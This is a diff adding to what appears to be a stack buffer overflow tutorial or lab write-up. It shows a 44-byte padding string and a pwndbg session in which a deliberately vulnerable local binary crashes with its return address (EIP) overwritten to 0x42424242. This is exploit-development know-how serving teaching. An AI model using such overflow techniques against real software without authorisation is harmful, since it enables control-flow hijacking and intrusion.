@@ -127,3 +127,36 @@ After those 44 we are overwriting the return address. Let's verify it:
 >>> 'A'*44 + 'BBBB'
 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB'
 ```
+
+```
+pwndbg> run
+Starting program:  
+No executable file specified.
+Use the "file" or "exec-file" command.
+pwndbg> exec-file vuln
+pwndbg> run
+Starting program: /home/connor/Desktop/vuln 
+[Thread debugging using libthread_db enabled]                                                              
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Okay, time to return... Fingers Crossed... Jumping to 0x42424242
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────
+*EAX  0x41
+*EBX  0x41414141 ('AAAA')
+ ECX  0x0
+ EDX  0x0
+*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
+*ESI  0x8049350 ◂— endbr32 
+*EBP  0x41414141 ('AAAA')
+*ESP  0xffffd5f0 ◂— 0xffffff00
+*EIP  0x42424242 ('BBBB')
+────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────
+Invalid address 0x42424242
+
+...
+```
